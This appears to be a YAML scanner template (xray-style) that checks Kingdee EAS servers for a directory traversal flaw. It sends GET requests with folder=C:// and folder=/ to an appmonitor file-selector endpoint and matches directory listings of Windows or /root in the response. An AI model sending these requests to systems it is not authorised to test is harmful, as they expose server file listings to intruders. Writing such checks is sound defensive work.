id: kingdee-eas-directory-traversal

info:
    name: kingdee-eas-directory-traversal
    author: iak3ec(https://github.com/nu0l)
    severity: high

manual: true
transport: http
rules:
  kingdee1:
    request:
      cache: true
      method: GET
      path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
    expression: response.status == 200 && response.headers["content-type"].contains("json") && response.body.bcontains(b"{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}")
  kingdee2:
    request:
      cache: true
      method: GET
      path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
    expression: response.status == 200 && response.headers["content-type"].contains("json") && response.body.bcontains(b"{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}")
expression: kingdee1() || kingdee2()
